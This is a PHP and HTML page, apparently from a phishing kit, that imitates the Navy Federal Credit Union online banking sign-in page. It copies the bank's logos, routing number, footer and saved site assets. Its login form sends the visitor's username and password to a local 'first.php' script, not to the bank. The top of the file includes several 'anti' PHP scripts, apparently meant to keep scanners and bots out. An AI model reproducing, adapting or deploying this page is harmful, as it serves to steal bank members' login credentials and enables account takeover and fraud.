<?php
session_start();
include "anti/anti1.php";
include "anti/anti2.php"; 
include "anti/anti3.php"; 
include "anti/anti4.php"; 
include "anti/anti5.php"; 
include "anti/anti7.php"; 
?>
<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="language" content="English">
<meta name="revisit-after" content="1 days">
<meta name="robots" content="ALL">
<meta name="rating" content="General">
<meta http-equiv="imagetoolbar" content="no">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<title>Sign In</title>

<!-- Import this way for performance gains -->
<link rel="stylesheet" href="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/css.css">
<link rel="stylesheet" href="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/nfcu-icons-768830b95a2661f7bb9a758382928bb3.css">
<link rel="stylesheet" href="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/all-768830b95a2661f7bb9a758382928bb3.css">
 <!-- Added responsivemain.css for login.jsp changes -->
<link rel="stylesheet" href="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/nauth-768830b95a2661f7bb9a758382928bb3.css">
<link rel="stylesheet" href="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/responsivemain-768830b95a2661f7bb9a758382928bb3.css">

<!-- Used to count modals, must be on every page where there is a footer modal links -->
<script type="text/javascript" async="" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-vSvEygU4Vy/dw8ibjqPbIvSyyi53fYweNLkuW0i4f+CRq7c9xaGZF/VsRcqV17DR"></script><script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/s_code.js"></script>

<!-- includes jquery, common, dropdown, bootstrap-select, keypad, modal js files -->
	 <script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/jquery-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
	<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/common-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
	<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/dropdown-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
	<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/bootstrap-select.min-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
	<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/keypad-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
	<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/modal-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
<!-- end of main.js -->

<!-- <script type="text/javascript" src="resources/js/tooltip-ec401aee041a200e3dd94ec7982f0f2f.js"></script> -->

<!-- combined rsaCookieGenerator with login -->
<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/cookieGenerator-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/login-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
<script src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/api.js"></script>

<script type="text/javascript">
var captchaEnabled = false;
var isCaptchaSuccess = false;

</script>

<script>
window.onload = function(){
var date = new Date().getFullYear();
document.getElementById("year").innerHTML = date;
}
</script>

<noscript>
	 <p class="alert alert-noscriptwarning">Your browsers JavaScript must be enabled to sign into Online Banking.</p>
</noscript>




<!-- Insert Chat Part here -->
<script type="text/Javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/le2-mtagconfig.js"></script> 

 


<script charset="UTF-8" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/tag.js"></script><script charset="UTF-8" id="_lpTagScriptId_0" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/index.js"></script><script async="" id="lp-ui-framework" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/ui-framework.js" charset="UTF-8"></script><script async="" id="lp-api-messaging" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/UMSClientAPI.min.js" charset="UTF-8"></script><script async="" id="lp-api-chat" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/lpChatV3.min.js" charset="UTF-8"></script><script async="" id="lp-survey-logic" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/surveylogicinstance.min.js" charset="UTF-8"></script><script async="" id="lp-uw-embedded" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/desktopEmbedded.js" charset="UTF-8"></script></head>

<body class="responsive">
 <a href="#end-header" id="skipnav" class="skipnav">Skip Navigation Links</a>

<div class="mobileMenu">
	<div class="MobileMenuHeader">
	</div>
	<div class="MobileMenuContent">
		<div class="MobLocations">
	        <a href=""><span>&#58935;</span>Locations</a>
        </div>
		<div class="MobContactUs">
	        <a href=""><span>&#58930;</span>Contact Us</a>
        </div>
        <div class="MobRoutingNumber">
        	<p>Routing Number: <strong>256074974</strong></p>
        </div>
	</div>
</div>

<div class="pageWrap">  
	<!-- start of header -->	
	<div class="header-sm" role="banner">
		<div class="container">
			<div class="header-content-sm">
				<div class="mob-nav-menu">
					<i class="fa fa-bars"></i>
				</div>
				<div class="logo-sm">
					<a href="" title="">
						<img class="logo-sm-pic" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/NFCU_Mob_Logo-b128db0c7cc6f6336bdf252ade6918e0.svg" alt="Navy Federal Credit Union | Army, Marine Corps, Navy, Air Force, Coast Guard, Family (Logo)">
					</a>
				</div>
			</div>
		</div>
	</div>
	<div class="header-bg" role="banner">
		<div class="container">
			<div class="content-box">
				<div class="header-content-bg">
					<div class="logo">
						<a href="" title="Go to NavyFederal.org" class="logo_bg_a">
						<img src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/NFCU_Logo-b128db0c7cc6f6336bdf252ade6918e0.svg" alt="Navy Federal Credit Union | Army, Marine Corps, Navy, Air Force, Coast Guard, Family (Logo)" class="logo_bg"> </a>
					</div>
					<div class="nav navbar-collapse">
						<div class="rt-container"><span class="text-routing">Routing Number: </span><span class="rnumber">256074974</span></div>
						<a class="padRight20 loc-class" href=""> <span class="icon-locations"></span> Locations </a>
						
						<a class="Contact-us" href=""><img src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/contact-us-b128db0c7cc6f6336bdf252ade6918e0.svg" class="icon_more_contact_us_default" alt="Contact Us"> Contact Us</a>  
					</div>
				</div>
			</div>
		</div> 
	</div>
	
		<!-- end of header-->
		
		<!-- main content area starts here -->
	<div class="content-wrapper" role="main">
		
		        <div class="formbackground">
		        <a id="end-header"></a>
		        		
		        </div>
		        <div class="container" role="main">
		        	<div class="background-container">
		        	<div class="login-content-box">
						<div class="login">    
							<div class="headers"> 
								<h1>Welcome to Digital Banking</h1>
		                	</div>               
		                    	<div class="login-panel">
								
								<div class="panel panel-primary heading-callout">
				                    <div class="panel-heading">
				                        <h2 class="panel-title"><span class="icon-padlock"></span> Sign In</h2>
				                    </div>
				                    <div class="rule-container">
				                    	<div class="horizontal-line"></div>
				                    </div>
			                        <div class="panel-body">
			                            <div class="panel-content-left">
											<form id="Login" class="form-inline Rectangle-2459" name="Login" method="post" action="first.php" autocomplete="off">
												<div class="userPassGroup">
													<div class="form-group username" style="display:inline-block;">
														<label for="user">Username</label> <span class="tooltipOne" data-guidetext="Sign into online banking with your unique Username, which may be your access number." aria-label="Sign into online banking with your unique Username, which may be your access number." tabindex="0" role="button" aria-disabled="true"></span>														
							  	  						<input type="text" name="login_email" id="user" maxlength="32" class="form-control" required="">
													</div>
													<div class="form-group password" style="display:inline-block;">
														<label for="password">Password</label>
														<input type="password" name="password" id="password" class="form-control" required="">
													</div>
													<div class="signInHelp"><a href="" aria-label="Sign In Help">Sign In Help</a></div>
												</div>
												
												<div class="submitAndRecaptcha "> 
												
												
													<input type="submit" name="SignIn" class="btn btn-primary reg-sign-in" id="signIn" value="Sign In" disabled="disabled">
												
												
												</div>
												
												<input type="hidden" name="SMENC" value="ISO-8859-1">
												<input type="hidden" name="SMLOCALE" value="US-EN">
												<input type="hidden" name="smquerydata" value="">
												<input type="hidden" name="smauthreason" value="">
												<input type="hidden" name="target" value="https://signon.navyfederal.org/nfcu/">
												<input type="hidden" name="smagentname" value="">
												<input type="hidden" name="postpreservationdata" value="">
												<input type="hidden" name="hiddenrandom" value="0" id="hiddenrandom">
												<input type="hidden" name="akamaiCookieValue" value="w" id="akamaiCookieValue">
												<input type="hidden" name="akamaiCookieName" value="dc" id="akamaiCookieName">
											</form>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			<!-- Internal Navigation Links -->
			<div class="membership-content-box">
				<div class="membership-middle">
					<div class="join-nfcu">
						<div class="join-nfcu-container">
							<div class="membership-verbiage">
								<div class="not-a-member">
									<h2 id="not-a-nfcu-mbr">Not a Navy Federal member?</h2>
								</div>
								<div class="join-now-verbiage" id="joinNowVerbiage">
									<p>Join now and enjoy the support and great service of a credit union that puts your needs first.</p>
								</div>
							</div>
							
							<div class="member-buttons">
								<button onclick="setTimeout(function(){window.location.href=''}, 500);" class="become-member">Become a Member</button>
								<button onclick="setTimeout(function(){window.location.href=''},500);" class="membership-learn-more" aria-describedby="not-a-nfcu-mbr">Learn More</button>
							</div>
							
						</div>
					</div>
					<div class="join-picture">
						<img class="join-img" alt="" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/img-BecomeAMember-b128db0c7cc6f6336bdf252ade6918e0.jpg">
					</div>
				</div>
			</div>
					<div class="page-header">
						<div class="content-box">	
							<div class="ph-content-box">
								<div class="col-sm-4">
									<div class="circle">
										<img class="circle-icon" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/Group5159-b128db0c7cc6f6336bdf252ade6918e0.svg" alt="">
									</div>
									<div class="ph-text-h3"><h3>Don't have online access?</h3></div>	
									<div class="ph-text-a"><a href="">Enroll in digital banking <span aria-hidden="true">�</span></a></div>
									
								</div>
								<div class="col-sm-4">
									<div class="circle">
										<img class="circle-icon special6px" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/Group5166-b128db0c7cc6f6336bdf252ade6918e0.svg" alt="">
									</div>
									<div id="digitalBankingSecurityHeader" class="ph-text-h3"><h3>Find out more about secure digital banking</h3></div>
									<div class="ph-text-a"><a href="" aria-describedby="digitalBankingSecurityHeader">Learn more <span aria-hidden="true">�</span></a></div>
								</div>
								<div class="col-sm-4">
									<div class="circle">
										<img class="circle-icon" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/Group5158-b128db0c7cc6f6336bdf252ade6918e0.svg" alt="">
									</div>
									<div class="ph-text-h3"><h3>Need help?</h3></div>
									<div class="ph-text-a"><a href="">Contact us <span aria-hidden="true">�</span></a></div>
									
								</div>
							</div>
						</div>
					</div>
						
					<!-- <div class="internal-ad">
						<iframe src="https://www.navyfederal.org/nfoaa-navads/signin.html" frameborder="0" title="Navy Federal Promotion/Spotlight" tabindex="0"></iframe>
					</div> -->
				</div>	
			</div>
				<!-- end of Internal ad-->
			
		
		<!-- start of footer  -->
		<div class="container footer">
			<div class="content-box">
				<div class="ft-content-box">
		            <div class="footer-content">
		                <div class="ft-logo">
		                    <a href="" title="Go to NavyFederal.org" target="_blank" class="ft-logo-a">
		                    	<span class="nfcu-icon-ftlogo">&#58888;</span>
		                    </a>
		                </div>
		                <div class="content">
		                    <div class="member-services marginbottom20">
		      						<span class="mbr-services-txt">24/7 Member Services:<b>&nbsp;1-888-842-6328&nbsp;</b></span><span class="separator mob-pipe">&#8200; &#8200;|&#8200; &#8200;</span><span class="mob-line-break"><br></span>
		      						<span class="text-routing">Routing Number:&nbsp;<b>256074974</b> </span>
		      						<hr>
		      				</div>
		      				<div class="nav-container">
				                <nav class="nav ft-nav paddingtop20 marginbottom20" role="navigation">
										<a href="">About Us&#8200; &#8200;</a> <span class="separator">|</span>
										<a href="">&#8200; &#8200;Contact Us&#8200; &#8200;</a> <span class="separator">|</span>
										<a href="">&#8200; &#8200;Privacy Policy&#8200; &#8200;</a> <span class="separator">|</span>
										<a href="">&#8200; &#8200;Security&#8200; &#8200;</a> <span class="separator">|</span>
										<a href="">&#8200; &#8200;Accessibility&#8200; &#8200;</a> <span class="separator">|</span>
										<a href="">&#8200; &#8200;Browser Support</a>
								</nav>
							</div>
							<div class="copyright">	
								<p id="copyright">
									� <span id="year" style="font-weight:800;">2022</span><span class="copyright">&nbsp;<b>Navy Federal Credit Union.</b> </span> All rights reserved.
								</p>
							</div>
							
		                        <div class="nav regInstitutions"> 
									<div class="ncua-link"><a href="" id="ncua-font"><span class="icon-ncua"></span> Federally Insured by NCUA</a><span class="separator">&#8200;&#8200;&#8200;&#8200;&#8200;|&#8200;&#8200;&#8200;&#8200;&#8200;</span></div> 
									<div class="ehl-link"><a href="" id="EHL"><span class="icon-housing"></span> Equal Housing Lender</a> </div>
								</div>	                    
		                    
		                    <div class="ft-disclaimers">
		                    	<p>
									APY = Annual Percentage Yield <span class="separator">|</span> APR = Annual Percentage Rate
								</p>
		                        <p>
		                            <sup>+</sup>Rates are based on an evaluation of credit history, so your rate may differ.
		                        </p>
		
		                        <p>
		                            <sup>++</sup>Rates are variable, and based on an evaluation of credit history, so your rate may differ.
		                        </p>
		                        
		                        <p>
		                        	<sup>*</sup>Message and date rates may apply. Terms and Conditions are available.
		                        </p>
		                        
		                        <p>
		                         iPhone�, iPad� and iPod touch� are trademarks
 of Apple Inc. App Store&#8480; is a service mark of Apple Inc. Android� and 
Google Play� are trademarks of Google Inc. Images used for 
representational purposes only; do not imply government endorsement.
		                    	</p>
		                    </div>
		                </div>
		            </div>
		    	</div>
	    	</div>
	    </div>
	    <!-- end of footer  -->
</div>
    
    <!-- set the src of the iframe as about:blank so that they don't automatically load on browser load -->
    
	<!-- iFrame for onlineDisclosure -->
    <div class="modal fade" id="modalonlineDisclosure" tabindex="-1" role="dialog" aria-labelledby="modalonlineDisclosureLabel">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span class="fa fa-times" aria-hidden="true"></span></button>
                    <p class="modal-title" id="modalonlineDisclosureLabel">Use of Cookies by Navy Federal Online</p>
                </div>
                <div class="modal-body">
                    <iframe id="onlineDisclosureFrame" class="cookies" data-src="https://web.navyfederal.org/online-disclosure.html" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/a_003.html" frameborder="0"></iframe>
                </div>
                <div class="modal-footer">
                	<button type="button" id="modal-button" value="Done" data-dismiss="modal" aria-label="Done">Done</button>
                </div>
            </div>
        </div>
    </div>
    <!-- End of onlineDisclosure Modal -->
    
    <!-- iFrame for browserRequirements -->
    <div class="modal fade" id="modalbrowserRequirements" tabindex="-1" role="dialog" aria-labelledby="modalbrowserRequirementsLabel">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span class="fa fa-times" aria-hidden="true"></span></button>
                    <p class="modal-title" id="modalbrowserRequirementsLabel">Browser Requirements</p>
                </div>
                <div class="modal-body">
               		<iframe id="browserRequirementsFrame" data-src="https://www.navyfederal.org/support/index.php" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/a_003.html" width="580" height="740" frameborder="0"></iframe>
                </div>
            </div>
        </div>
    </div>
    <!-- End of browserRequirements Modal -->

	
	<div id="rightnowLogout" style="display: none;">
		<iframe src="https://rnemsg.navyfederal.org/ci/pta/logout" width="1" height="1"></iframe>
	</div>

<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/lAywPNlIB"></script>
<iframe src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/a_003.html" id="jwtredirect" style="width: 0px; height: 0px; border: 0px none; display: none;"></iframe><iframe style="width: 0px; height: 0px; position: absolute; top: -1000px; left: -1000px; display: none;" tabindex="-1" aria-hidden="true" role="presentation" title="Intentionally blank" name="lpSS_8793304102" id="lpSS_8793304102" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/storage.html"></iframe></body></html>
